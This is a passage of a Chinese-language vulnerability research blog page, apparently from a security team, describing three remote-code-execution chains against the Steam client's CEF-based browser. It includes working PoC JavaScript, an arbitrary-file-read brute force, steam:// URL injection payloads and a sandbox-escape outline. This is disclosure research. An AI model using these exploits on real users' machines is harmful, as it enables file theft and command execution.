<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Steam漏洞利用：CEF框架应用下的常规与非常规利用手段 | DARKNAVY</title>
<meta name=keywords content><meta name=description content='前言
Chromium Embedded Framework(CEF)是一个开源框架，开发者可以将Chromium引擎嵌入至他们的应用程序中。尽管CEF被广泛应用于诸如微信和Epic Games Launcher等流行软件中，但对其安全性的研究却甚少。在本文中，我们将以Steam客户端浏览器（一款基于CEF的应用程序）为例，介绍我们发现的漏洞及其利用方式，展示我们如何构建了三个远程代码执行（RCE）链。
RCE#1：steamwebhelper中多个问题导致RCE
steamwebhelper是Steam客户端内置的浏览器，用于渲染商店、社区、好友等页面。其基于CEF开发，并在CEF的基础上添加了一些功能。我们在这些额外的功能中找到了一系列逻辑漏洞以及特性导致的问题，最终完成了RCE。
在外部页面中获取SteamClient对象
steamwebhelper在加载一些特定的页面，例如steampowered.com 、 steamloopback.host等页面时，会在JavaScript运行环境中加入一个特权对象SteamClient。对该过程进行逆向后，我们发现，对有域名的url，steamwebhelper会调用BIsTrustedDomain检查其域名是否在白名单中，而对于没有域名的url，会检查其是否为data或about协议。

在外部页面中打开白名单中的域名会被同源策略限制，然而打开about:blank等页面并不会，因此我们可以在自己可控的页面中打开"about:blank"，获取并使用其SteamClient。
PoC:
ab_page = open("about:blank");
s_client = ab_page.SteamClient;
alert(s_client);
使用BrowserView加载file协议
SteamClient是steam中内部页面所使用的特权对象，它有很多特权功能，如操作当前的Browser对象、操作窗口位置、下载任意文件等。

通过SteamClient.BrowserView，我们可以创建并管理BrowserView。经过测试发现，BrowserView是一个嵌入在原始网页中的子页面，类似于普通web页面中的一个iframe，但与此对象的交互都是由Steam自身实现。

在测试BrowserView的功能时，我们发现BrowserView.LoadURL调用不会受到任何安全策略的限制，可以加载任意协议任意域名的url，包括chrome://、file://等权限较高的协议。
PoC:
b_view = s_client.BrowserView.Create();
b_view.LoadURL("file:///etc/passwd");
b_view.SetBounds(0, 0, 1000, 1000);
b_view.SetVisible(true);
获取BrowserView中加载的页面内容，实现任意文件读
至此我们已可以通过LoadURL加载到本地的任意文件，但是还没有办法直接读取到页面内容。通过测试逆向BrowserView对象，发现其提供了FindInPage功能可以在页面中搜索特定字符串，并且通过调用BrowserView.on("find-in-page-results", callback)可以注册一个回调函数来处理搜索的结果。那么问题变成了：如果可以在页面内搜索一个可控字符串并获取到搜索结果，能否获取到页面的内容？（听起来像是一道CTF题目）
答案是肯定的，最终通过逐字节爆破搜索，我们可以做到任意文件读的效果。
PoC（通过读file:///home/获取用户名）:
async function is_str_in_bv(bv, s, count) {
  window.stage = 0;
  bv.FindInPage(s, true, true);
  while (window.stage < 3) { await sleep(10); }
  return window.count > count;
}

b_view.on("find-in-page-results", (a, b) => {
  if (window.stage == 0) {
    if (a == 0 && b == 0) { window.stage = 3; window.count = 0; }
    else window.stage++;
  }
  else if (window.stage++ == 2) window.count = a;
});
baseuser = "/";
charset = "abcdefghijklmnopqrstuvwxyz";
while (true) {
  found = false;
  for (c of charset) {
    teststr = c + baseuser;
    count = 0;
    if ("home/".endsWith(teststr)) count = 1;
    if (await is_str_in_bv(b_view, teststr, count)) {
      found = true;
      break;
    };
  }
  if (!found) break;
  baseuser = teststr;
}
alert(baseuser);
从任意文件读到任意文件创建
在这篇漏洞报告中提到了，通过steam://devkit-1中的list-shortcuts等功能可以做到任意文件创建（文件内容不可控），而这个漏洞的修复方式是在~/.steam/steam.token文件中随机生成一个字符串，在使用steam://devkit-1相关功能时，会验证token是否正确。事实上此方式并未对此功能逻辑上的缺陷进行修复，若攻击者可以读取到token，则可以轻易bypass此修复。'><meta name=author content="DARKNAVY"><link rel=canonical href=https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><link crossorigin=anonymous href=/assets/css/stylesheet.38a584f0fc0f77186c8518d4117588a5b01cffe28707e993a6ae5cd5e2b0c5d0.css integrity="sha256-OKWE8PwPdxhshRjUEXWIpbAc/+KHB+mTpq5c1eKwxdA=" rel="preload stylesheet" as=style><link rel=icon href=https://www.darknavy.org/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://www.darknavy.org/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://www.darknavy.org/favicon-32x32.png><link rel=apple-touch-icon href=https://www.darknavy.org/apple-touch-icon.png><link rel=mask-icon href=https://www.darknavy.org/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><link rel=alternate hreflang=zh href=https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-LR4ZN1LSPS"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-LR4ZN1LSPS")}</script><meta property="og:title" content="Steam漏洞利用：CEF框架应用下的常规与非常规利用手段"><meta property="og:description" content='前言
Chromium Embedded Framework(CEF)是一个开源框架，开发者可以将Chromium引擎嵌入至他们的应用程序中。尽管CEF被广泛应用于诸如微信和Epic Games Launcher等流行软件中，但对其安全性的研究却甚少。在本文中，我们将以Steam客户端浏览器（一款基于CEF的应用程序）为例，介绍我们发现的漏洞及其利用方式，展示我们如何构建了三个远程代码执行（RCE）链。
RCE#1：steamwebhelper中多个问题导致RCE
steamwebhelper是Steam客户端内置的浏览器，用于渲染商店、社区、好友等页面。其基于CEF开发，并在CEF的基础上添加了一些功能。我们在这些额外的功能中找到了一系列逻辑漏洞以及特性导致的问题，最终完成了RCE。
在外部页面中获取SteamClient对象
steamwebhelper在加载一些特定的页面，例如steampowered.com 、 steamloopback.host等页面时，会在JavaScript运行环境中加入一个特权对象SteamClient。对该过程进行逆向后，我们发现，对有域名的url，steamwebhelper会调用BIsTrustedDomain检查其域名是否在白名单中，而对于没有域名的url，会检查其是否为data或about协议。

在外部页面中打开白名单中的域名会被同源策略限制，然而打开about:blank等页面并不会，因此我们可以在自己可控的页面中打开"about:blank"，获取并使用其SteamClient。
PoC:
ab_page = open("about:blank");
s_client = ab_page.SteamClient;
alert(s_client);
使用BrowserView加载file协议
SteamClient是steam中内部页面所使用的特权对象，它有很多特权功能，如操作当前的Browser对象、操作窗口位置、下载任意文件等。

通过SteamClient.BrowserView，我们可以创建并管理BrowserView。经过测试发现，BrowserView是一个嵌入在原始网页中的子页面，类似于普通web页面中的一个iframe，但与此对象的交互都是由Steam自身实现。

在测试BrowserView的功能时，我们发现BrowserView.LoadURL调用不会受到任何安全策略的限制，可以加载任意协议任意域名的url，包括chrome://、file://等权限较高的协议。
PoC:
b_view = s_client.BrowserView.Create();
b_view.LoadURL("file:///etc/passwd");
b_view.SetBounds(0, 0, 1000, 1000);
b_view.SetVisible(true);
获取BrowserView中加载的页面内容，实现任意文件读
至此我们已可以通过LoadURL加载到本地的任意文件，但是还没有办法直接读取到页面内容。通过测试逆向BrowserView对象，发现其提供了FindInPage功能可以在页面中搜索特定字符串，并且通过调用BrowserView.on("find-in-page-results", callback)可以注册一个回调函数来处理搜索的结果。那么问题变成了：如果可以在页面内搜索一个可控字符串并获取到搜索结果，能否获取到页面的内容？（听起来像是一道CTF题目）
答案是肯定的，最终通过逐字节爆破搜索，我们可以做到任意文件读的效果。
PoC（通过读file:///home/获取用户名）:
async function is_str_in_bv(bv, s, count) {
  window.stage = 0;
  bv.FindInPage(s, true, true);
  while (window.stage < 3) { await sleep(10); }
  return window.count > count;
}

b_view.on("find-in-page-results", (a, b) => {
  if (window.stage == 0) {
    if (a == 0 && b == 0) { window.stage = 3; window.count = 0; }
    else window.stage++;
  }
  else if (window.stage++ == 2) window.count = a;
});
baseuser = "/";
charset = "abcdefghijklmnopqrstuvwxyz";
while (true) {
  found = false;
  for (c of charset) {
    teststr = c + baseuser;
    count = 0;
    if ("home/".endsWith(teststr)) count = 1;
    if (await is_str_in_bv(b_view, teststr, count)) {
      found = true;
      break;
    };
  }
  if (!found) break;
  baseuser = teststr;
}
alert(baseuser);
从任意文件读到任意文件创建
在这篇漏洞报告中提到了，通过steam://devkit-1中的list-shortcuts等功能可以做到任意文件创建（文件内容不可控），而这个漏洞的修复方式是在~/.steam/steam.token文件中随机生成一个字符串，在使用steam://devkit-1相关功能时，会验证token是否正确。事实上此方式并未对此功能逻辑上的缺陷进行修复，若攻击者可以读取到token，则可以轻易bypass此修复。'><meta property="og:type" content="article"><meta property="og:url" content="https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/"><meta property="og:image" content="https://www.darknavy.org/images/white_logo.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2024-06-27T11:39:37+08:00"><meta property="article:modified_time" content="2024-06-27T11:39:37+08:00"><meta property="og:site_name" content="DARKNAVY"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://www.darknavy.org/images/white_logo.png"><meta name=twitter:title content="Steam漏洞利用：CEF框架应用下的常规与非常规利用手段"><meta name=twitter:description content='前言
Chromium Embedded Framework(CEF)是一个开源框架，开发者可以将Chromium引擎嵌入至他们的应用程序中。尽管CEF被广泛应用于诸如微信和Epic Games Launcher等流行软件中，但对其安全性的研究却甚少。在本文中，我们将以Steam客户端浏览器（一款基于CEF的应用程序）为例，介绍我们发现的漏洞及其利用方式，展示我们如何构建了三个远程代码执行（RCE）链。
RCE#1：steamwebhelper中多个问题导致RCE
steamwebhelper是Steam客户端内置的浏览器，用于渲染商店、社区、好友等页面。其基于CEF开发，并在CEF的基础上添加了一些功能。我们在这些额外的功能中找到了一系列逻辑漏洞以及特性导致的问题，最终完成了RCE。
在外部页面中获取SteamClient对象
steamwebhelper在加载一些特定的页面，例如steampowered.com 、 steamloopback.host等页面时，会在JavaScript运行环境中加入一个特权对象SteamClient。对该过程进行逆向后，我们发现，对有域名的url，steamwebhelper会调用BIsTrustedDomain检查其域名是否在白名单中，而对于没有域名的url，会检查其是否为data或about协议。

在外部页面中打开白名单中的域名会被同源策略限制，然而打开about:blank等页面并不会，因此我们可以在自己可控的页面中打开"about:blank"，获取并使用其SteamClient。
PoC:
ab_page = open("about:blank");
s_client = ab_page.SteamClient;
alert(s_client);
使用BrowserView加载file协议
SteamClient是steam中内部页面所使用的特权对象，它有很多特权功能，如操作当前的Browser对象、操作窗口位置、下载任意文件等。

通过SteamClient.BrowserView，我们可以创建并管理BrowserView。经过测试发现，BrowserView是一个嵌入在原始网页中的子页面，类似于普通web页面中的一个iframe，但与此对象的交互都是由Steam自身实现。

在测试BrowserView的功能时，我们发现BrowserView.LoadURL调用不会受到任何安全策略的限制，可以加载任意协议任意域名的url，包括chrome://、file://等权限较高的协议。
PoC:
b_view = s_client.BrowserView.Create();
b_view.LoadURL("file:///etc/passwd");
b_view.SetBounds(0, 0, 1000, 1000);
b_view.SetVisible(true);
获取BrowserView中加载的页面内容，实现任意文件读
至此我们已可以通过LoadURL加载到本地的任意文件，但是还没有办法直接读取到页面内容。通过测试逆向BrowserView对象，发现其提供了FindInPage功能可以在页面中搜索特定字符串，并且通过调用BrowserView.on("find-in-page-results", callback)可以注册一个回调函数来处理搜索的结果。那么问题变成了：如果可以在页面内搜索一个可控字符串并获取到搜索结果，能否获取到页面的内容？（听起来像是一道CTF题目）
答案是肯定的，最终通过逐字节爆破搜索，我们可以做到任意文件读的效果。
PoC（通过读file:///home/获取用户名）:
async function is_str_in_bv(bv, s, count) {
  window.stage = 0;
  bv.FindInPage(s, true, true);
  while (window.stage < 3) { await sleep(10); }
  return window.count > count;
}

b_view.on("find-in-page-results", (a, b) => {
  if (window.stage == 0) {
    if (a == 0 && b == 0) { window.stage = 3; window.count = 0; }
    else window.stage++;
  }
  else if (window.stage++ == 2) window.count = a;
});
baseuser = "/";
charset = "abcdefghijklmnopqrstuvwxyz";
while (true) {
  found = false;
  for (c of charset) {
    teststr = c + baseuser;
    count = 0;
    if ("home/".endsWith(teststr)) count = 1;
    if (await is_str_in_bv(b_view, teststr, count)) {
      found = true;
      break;
    };
  }
  if (!found) break;
  baseuser = teststr;
}
alert(baseuser);
从任意文件读到任意文件创建
在这篇漏洞报告中提到了，通过steam://devkit-1中的list-shortcuts等功能可以做到任意文件创建（文件内容不可控），而这个漏洞的修复方式是在~/.steam/steam.token文件中随机生成一个字符串，在使用steam://devkit-1相关功能时，会验证token是否正确。事实上此方式并未对此功能逻辑上的缺陷进行修复，若攻击者可以读取到token，则可以轻易bypass此修复。'><meta name=twitter:site content="@DarkNavyOrg"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"博客","item":"https://www.darknavy.org/zh/blog/"},{"@type":"ListItem","position":2,"name":"Steam漏洞利用：CEF框架应用下的常规与非常规利用手段","item":"https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Steam漏洞利用：CEF框架应用下的常规与非常规利用手段","name":"Steam漏洞利用：CEF框架应用下的常规与非常规利用手段","description":"前言 Chromium Embedded Framework(CEF)是一个开源框架，开发者可以将Chromium引擎嵌入至他们的应用程序中。尽管CEF被广泛应用于诸如微信和Epic Games Launcher等流行软件中，但对其安全性的研究却甚少。在本文中，我们将以Steam客户端浏览器（一款基于CEF的应用程序）为例，介绍我们发现的漏洞及其利用方式，展示我们如何构建了三个远程代码执行（RCE）链。\nRCE#1：steamwebhelper中多个问题导致RCE steamwebhelper是Steam客户端内置的浏览器，用于渲染商店、社区、好友等页面。其基于CEF开发，并在CEF的基础上添加了一些功能。我们在这些额外的功能中找到了一系列逻辑漏洞以及特性导致的问题，最终完成了RCE。\n在外部页面中获取SteamClient对象 steamwebhelper在加载一些特定的页面，例如steampowered.com 、 steamloopback.host等页面时，会在JavaScript运行环境中加入一个特权对象SteamClient。对该过程进行逆向后，我们发现，对有域名的url，steamwebhelper会调用BIsTrustedDomain检查其域名是否在白名单中，而对于没有域名的url，会检查其是否为data或about协议。\n在外部页面中打开白名单中的域名会被同源策略限制，然而打开about:blank等页面并不会，因此我们可以在自己可控的页面中打开\u0026quot;about:blank\u0026quot;，获取并使用其SteamClient。\nPoC:\nab_page = open(\u0026#34;about:blank\u0026#34;); s_client = ab_page.SteamClient; alert(s_client); 使用BrowserView加载file协议 SteamClient是steam中内部页面所使用的特权对象，它有很多特权功能，如操作当前的Browser对象、操作窗口位置、下载任意文件等。\n通过SteamClient.BrowserView，我们可以创建并管理BrowserView。经过测试发现，BrowserView是一个嵌入在原始网页中的子页面，类似于普通web页面中的一个iframe，但与此对象的交互都是由Steam自身实现。\n在测试BrowserView的功能时，我们发现BrowserView.LoadURL调用不会受到任何安全策略的限制，可以加载任意协议任意域名的url，包括chrome://、file://等权限较高的协议。\nPoC:\nb_view = s_client.BrowserView.Create(); b_view.LoadURL(\u0026#34;file:///etc/passwd\u0026#34;); b_view.SetBounds(0, 0, 1000, 1000); b_view.SetVisible(true); 获取BrowserView中加载的页面内容，实现任意文件读 至此我们已可以通过LoadURL加载到本地的任意文件，但是还没有办法直接读取到页面内容。通过测试逆向BrowserView对象，发现其提供了FindInPage功能可以在页面中搜索特定字符串，并且通过调用BrowserView.on(\u0026quot;find-in-page-results\u0026quot;, callback)可以注册一个回调函数来处理搜索的结果。那么问题变成了：如果可以在页面内搜索一个可控字符串并获取到搜索结果，能否获取到页面的内容？（听起来像是一道CTF题目）\n答案是肯定的，最终通过逐字节爆破搜索，我们可以做到任意文件读的效果。\nPoC（通过读file:///home/获取用户名）:\nasync function is_str_in_bv(bv, s, count) { window.stage = 0; bv.FindInPage(s, true, true); while (window.stage \u0026lt; 3) { await sleep(10); } return window.count \u0026gt; count; } b_view.on(\u0026#34;find-in-page-results\u0026#34;, (a, b) =\u0026gt; { if (window.stage == 0) { if (a == 0 \u0026amp;\u0026amp; b == 0) { window.stage = 3; window.count = 0; } else window.stage++; } else if (window.stage++ == 2) window.count = a; }); baseuser = \u0026#34;/\u0026#34;; charset = \u0026#34;abcdefghijklmnopqrstuvwxyz\u0026#34;; while (true) { found = false; for (c of charset) { teststr = c + baseuser; count = 0; if (\u0026#34;home/\u0026#34;.endsWith(teststr)) count = 1; if (await is_str_in_bv(b_view, teststr, count)) { found = true; break; }; } if (!found) break; baseuser = teststr; } alert(baseuser); 从任意文件读到任意文件创建 在这篇漏洞报告中提到了，通过steam://devkit-1中的list-shortcuts等功能可以做到任意文件创建（文件内容不可控），而这个漏洞的修复方式是在~/.steam/steam.token文件中随机生成一个字符串，在使用steam://devkit-1相关功能时，会验证token是否正确。事实上此方式并未对此功能逻辑上的缺陷进行修复，若攻击者可以读取到token，则可以轻易bypass此修复。\n","keywords":[],"articleBody":"前言 Chromium Embedded Framework(CEF)是一个开源框架，开发者可以将Chromium引擎嵌入至他们的应用程序中。尽管CEF被广泛应用于诸如微信和Epic Games Launcher等流行软件中，但对其安全性的研究却甚少。在本文中，我们将以Steam客户端浏览器（一款基于CEF的应用程序）为例，介绍我们发现的漏洞及其利用方式，展示我们如何构建了三个远程代码执行（RCE）链。\nRCE#1：steamwebhelper中多个问题导致RCE steamwebhelper是Steam客户端内置的浏览器，用于渲染商店、社区、好友等页面。其基于CEF开发，并在CEF的基础上添加了一些功能。我们在这些额外的功能中找到了一系列逻辑漏洞以及特性导致的问题，最终完成了RCE。\n在外部页面中获取SteamClient对象 steamwebhelper在加载一些特定的页面，例如steampowered.com 、 steamloopback.host等页面时，会在JavaScript运行环境中加入一个特权对象SteamClient。对该过程进行逆向后，我们发现，对有域名的url，steamwebhelper会调用BIsTrustedDomain检查其域名是否在白名单中，而对于没有域名的url，会检查其是否为data或about协议。\n在外部页面中打开白名单中的域名会被同源策略限制，然而打开about:blank等页面并不会，因此我们可以在自己可控的页面中打开\"about:blank\"，获取并使用其SteamClient。\nPoC:\nab_page = open(\"about:blank\"); s_client = ab_page.SteamClient; alert(s_client); 使用BrowserView加载file协议 SteamClient是steam中内部页面所使用的特权对象，它有很多特权功能，如操作当前的Browser对象、操作窗口位置、下载任意文件等。\n通过SteamClient.BrowserView，我们可以创建并管理BrowserView。经过测试发现，BrowserView是一个嵌入在原始网页中的子页面，类似于普通web页面中的一个iframe，但与此对象的交互都是由Steam自身实现。\n在测试BrowserView的功能时，我们发现BrowserView.LoadURL调用不会受到任何安全策略的限制，可以加载任意协议任意域名的url，包括chrome://、file://等权限较高的协议。\nPoC:\nb_view = s_client.BrowserView.Create(); b_view.LoadURL(\"file:///etc/passwd\"); b_view.SetBounds(0, 0, 1000, 1000); b_view.SetVisible(true); 获取BrowserView中加载的页面内容，实现任意文件读 至此我们已可以通过LoadURL加载到本地的任意文件，但是还没有办法直接读取到页面内容。通过测试逆向BrowserView对象，发现其提供了FindInPage功能可以在页面中搜索特定字符串，并且通过调用BrowserView.on(\"find-in-page-results\", callback)可以注册一个回调函数来处理搜索的结果。那么问题变成了：如果可以在页面内搜索一个可控字符串并获取到搜索结果，能否获取到页面的内容？（听起来像是一道CTF题目）\n答案是肯定的，最终通过逐字节爆破搜索，我们可以做到任意文件读的效果。\nPoC（通过读file:///home/获取用户名）:\nasync function is_str_in_bv(bv, s, count) { window.stage = 0; bv.FindInPage(s, true, true); while (window.stage \u003c 3) { await sleep(10); } return window.count \u003e count; } b_view.on(\"find-in-page-results\", (a, b) =\u003e { if (window.stage == 0) { if (a == 0 \u0026\u0026 b == 0) { window.stage = 3; window.count = 0; } else window.stage++; } else if (window.stage++ == 2) window.count = a; }); baseuser = \"/\"; charset = \"abcdefghijklmnopqrstuvwxyz\"; while (true) { found = false; for (c of charset) { teststr = c + baseuser; count = 0; if (\"home/\".endsWith(teststr)) count = 1; if (await is_str_in_bv(b_view, teststr, count)) { found = true; break; }; } if (!found) break; baseuser = teststr; } alert(baseuser); 从任意文件读到任意文件创建 在这篇漏洞报告中提到了，通过steam://devkit-1中的list-shortcuts等功能可以做到任意文件创建（文件内容不可控），而这个漏洞的修复方式是在~/.steam/steam.token文件中随机生成一个字符串，在使用steam://devkit-1相关功能时，会验证token是否正确。事实上此方式并未对此功能逻辑上的缺陷进行修复，若攻击者可以读取到token，则可以轻易bypass此修复。\n此时，我们正好可以用任意文件读获取到token的内容，从而使用该功能创建任意文件。\n然而设想很美好，从steamwebhelper中打开steam://url时会有检查，只有在白名单中的功能可以直接从内置浏览器中打开，而devkit-1并不在其中。\n经过我们的研究发现，白名单中的steam://openexternalforpid/会解析其内部的url并加载，通过打开steam://openexternalforpid/1/steam://devkit-1/即可绕过白名单的检查，从而实现任意文件创建。\nPoC:\nopen(\"steam://openexternalforpid/1/steam://devkit-1/\" + token + \"/list-shortcuts?response=/tmp/hacked\"); 任意文件创建到RCE 在众多steam://url提供的功能中，steam://AddNonSteamGame看起来很有趣。顾名思义，它可以将用户提供的字符串作为一个非Steam游戏添加到Steam的游戏库中。Steam客户端会将非Steam游戏当作shell脚本执行，因此，我们可以在字符串中加入反引号来创建一个可以执行任意命令的游戏。想要使用这个功能，需要先创建/tmp/addnonsteamgamefile文件，Steam客户端会检查该文件是否存在，并尝试从中读取gameid。如果它读取到的gameid无效，就会随机生成一个，也就是说，文件里的内容并不影响功能。\n巧合的是，我们此前的任意文件创建恰好可以满足此需求，从而能够添加任意自定义的游戏。\n在尝试触发时，我们发现steam://openexternalforpid会将要打开的url中的域名转换为小写，即steam://openexternalforpid/1/steam://AddNonSteamGame/会变为steam://addnonsteamgame/，这样会导致该功能无法被Steam正确识别。\n经常尝试，我们发现可以通过再加一层steam://open来bypass：\n此时我们终于可以任意创建恶意游戏，但是打开游戏需要知道游戏的gameid，而我们并不知道这个随机生成的64位数字。这对于已经拥有任意文件读能力的我们并不是个大问题，我们通过读取~/.local/share/Steam/logs/console_log.txt，可以找到新创建出的恶意游戏的App id。\n[2023-11-21 04:11:53] ExecuteSteamURL: \"steam://open/steam://AddNonSteamGame/%60gnome-calculator%60\" [2023-11-21 04:11:53] ExecuteSteamURL: \"steam://AddNonSteamGame/%60gnome-calculator%60\" [2023-11-21 04:11:53] GLibLog: domain:Gtk msg:gtk_disable_setlocale() must be called before gtk_init() [2023-11-21 04:11:53] sanitize shortcut app id \"`gnome-calculator`\": replacing 0 with 3843969204, reason: k_unAppIdInvalid 最终的gameid可由log中的App id计算得来，计算方法为：app_id \u003c\u003c 32 | 0x2000000。在知道了gameid之后，就可以使用steam://rungameid来启动它。\n完整的利用代码我们已公开在我们的GitHub。\nRCE#2：steam://rungame命令注入 steam://rungame是Steam提供的一个url scheme功能可以用于启动游戏并指定其命令行参数，在Linux客户端中打开会执行如下命令：\n/bin/sh -c /home/bob/.local/share/Steam/ubuntu12_32/reaper SteamLaunch AppId={appid} -- /home/bob/.local/share/Steam/ubuntu12_32/steam-launch-wrapper -- {gamepath} {argument} 由于是/bin/sh -c执行的，存在命令注入的可能，尝试在命令行参数中加入`ls`，发现会变成'`ls`'，由于反引号被单引号包裹，无法直接命令注入。\n接着尝试在命令行参数中加入单引号来破坏单引号的配对，却发现单引号直接消失了。\n于是我们对steam://rungame的逻辑进行了简单的逆向分析，发现其步骤大致如下：\n调用V_ParseShellCommandLine，直接出现的'会被过滤，而\\'会被替换成' 调用V_EscapeShellArgumentAndAppend在参数两侧加上单引号，并将参数中的'替换成'\\'' 将\\替换成\\\\ 将其拼接进命令字符串执行 可以看出，第三步中所有的\\被当成了普通字符，为了/bin/sh能正常处理，添加了一个\\用于转义，却没有考虑到\\本身就是转义字符的可能性，如果我们将输入设置为\\'`gnome-calculator`\\'，在经历上述四步后会变成：''\\\\''`gnome-calculator`'\\\\'''，可以看出，将\\替换成\\\\破坏了单引号配对的正确性，导致`gnome-calculator`出现在单引号之外，产生了命令注入的问题。\n最后，为了生成能被steam://rungame正确处理的url，需要将\\进行url编码，最终的PoC：\n\u003ca href=\"steam://rungame/262410/76561202255233023/%5c'`gnome-calculator`%5c'\"\u003ePOPUP gnome-calculator\u003c/a\u003e 此PoC中的262410是《枪支世界：枪械拆解》的App id，可以将其替换成任意已安装的会解析命令行参数的游戏（大部分游戏均支持）。\nRCE#3：Chrome历史漏洞 Steam内置的浏览器是基于 Chromium Embedded Framework(CEF)的 85.0.4183.121版本开发的，CEF是一个用来把Chromium嵌入应用的框架，与Chromium的版本号同步，而Chromium 85.0.4183.121版本于2020年9月发布，到如今已经有了数不胜数的历史漏洞，而这些漏洞Steam几乎全未修复。\n我们选取了一个v8漏洞(Issue 1234764)以及一个用于沙箱逃逸的漏洞(Issue 1251727)来完成RCE。\n前者是一个循环右移优化错误，可以做到renderer进程的任意地址读写，其利用细节在漏洞报告的附件中已介绍得十分详细，在此不再赘述。\n后者是一个逻辑漏洞，通过Mojo调用CreateChildFrame创建的kPortal和kFencedframe两种类型的frame，状态永远都不会变成kCreated，导致其析构的时候不会调用WebContentsObserver::RenderFrameDeleted通知析构存有RenderFrameHostImpl裸指针的对象，从而构成UAF。该漏洞的品相非常好，free和use都可以主动在任意时刻触发，且后续可以使用任意RFH下的Mojo接口来利用。然而由于漏洞报告中的原始PoC采用的是源码patch的方式来触发漏洞，若想达到此效果，需要patch binary添加shellcode来发送Mojo消息。\n在实际编写exploit的过程中，为了减少工作量，我们想尽量少地patch binary，尽量使用JavaScript来编写exploit，但发现kPortal类型的frame无法加载指定src加载HTML，因此也就不能执行JavaScript。一个选择是通过patch来调用RenderFrameImpl::ExecuteJavaScript函数执行JavaScript，并在后续使用Tim Becker在Cleanly Escaping the Chrome Sandbox中提到的通用解决思路：将Mojo的handle从portal frame中发送给主frame来进行利用。\n然而此方法仍然需要patch，在此我们提出一个新的利用方法，在有renderer任意读写的情况下，可以不需要patch来让不能执行JavaScript的portal frame发送Mojo消息。\n经过我们的研究发现，发送Mojo消息时，实际的路由及处理由mojo::Remote的字段internal_state_.proxy_负责，我们可以利用v8漏洞从g_frame_map中读取到portal的RenderFrameImpl地址，将其发送消息的成员proxy_”偷“给另一个我们所控制的iframe，从而可以用该iframe伪装成portal使用JavaScript发送Mojo消息。\n整体的利用思路如下：\n利用v8漏洞开启mojo js\n创建一个iframe A，并使用v8漏洞劫持其虚表修改OwnerType，伪装成portal frame\n创建一个iframe B,用于后续执行JavaScript\n利用v8漏洞在g_frame_map中读取A和B的RenderFrameImpl地址\n利用v8漏洞将A的proxy_赋值给B\n使用B创建Mojo连接\n移除A，析构RenderFrameHostImpl\n使用B触发UAF\n使用Blob来占位、控虚表等后续利用\n","wordCount":"275","inLanguage":"zh","image":"https://www.darknavy.org/images/white_logo.png","datePublished":"2024-06-27T11:39:37+08:00","dateModified":"2024-06-27T11:39:37+08:00","author":{"@type":"Person","name":"DARKNAVY"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.darknavy.org/zh/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/"},"publisher":{"@type":"Organization","name":"DARKNAVY","logo":{"@type":"ImageObject","url":"https://www.darknavy.org/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://www.darknavy.org/zh/ accesskey=h title="  (Alt + H)"><img src=https://www.darknavy.org/images/darknavy_shenlan_dot.png alt aria-label=logo height=20></a><div class=logo-switches><ul class=lang-switch><li>|</li><li><a href=https://www.darknavy.org/ title=English aria-label=English>En</a></li></ul></div></div><ul id=menu><li><a href=https://www.darknavy.org/zh/ title=Home><span>Home</span></a></li><li><a href=https://www.darknavy.org/zh/blog/ title=Blog><span>Blog</span></a></li><li><a href=https://www.darknavy.org/zh/darknavy_insight/ title=Insight><span>Insight</span></a></li><li><a href=https://www.darknavy.org/zh/about/ title=About><span>About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://www.darknavy.org/zh/>主页</a>&nbsp;»&nbsp;<a href=https://www.darknavy.org/zh/blog/>博客</a></div><h1 class="post-title entry-hint-parent">Steam漏洞利用：CEF框架应用下的常规与非常规利用手段</h1><div class=post-meta><span title='2024-06-27 11:39:37 +0800 CST'>六月 27, 2024</span>&nbsp;·&nbsp;275 字&nbsp;·&nbsp;DARKNAVY&nbsp;|&nbsp;语言:<ul class=i18n_list><li><a href=https://www.darknavy.org/blog/exploiting_steam_usual_and_unusual_ways_in_the_cef_framework/>En</a></li></ul></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>目录</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#rce1steamwebhelper中多个问题导致rce>RCE#1：<code>steamwebhelper</code>中多个问题导致RCE</a><ul><li><a href=#在外部页面中获取steamclient对象>在外部页面中获取<code>SteamClient</code>对象</a></li><li><a href=#使用browserview加载file协议>使用<code>BrowserView</code>加载file协议</a></li><li><a href=#获取browserview中加载的页面内容实现任意文件读>获取<code>BrowserView</code>中加载的页面内容，实现任意文件读</a></li><li><a href=#从任意文件读到任意文件创建>从任意文件读到任意文件创建</a></li><li><a href=#任意文件创建到rce>任意文件创建到RCE</a></li></ul></li><li><a href=#rce2steamrungame命令注入>RCE#2：<code>steam://rungame</code>命令注入</a></li><li><a href=#rce3chrome历史漏洞>RCE#3：Chrome历史漏洞</a></li></ul></nav></div></details></div><div class=post-content><h2 id=前言>前言<a hidden 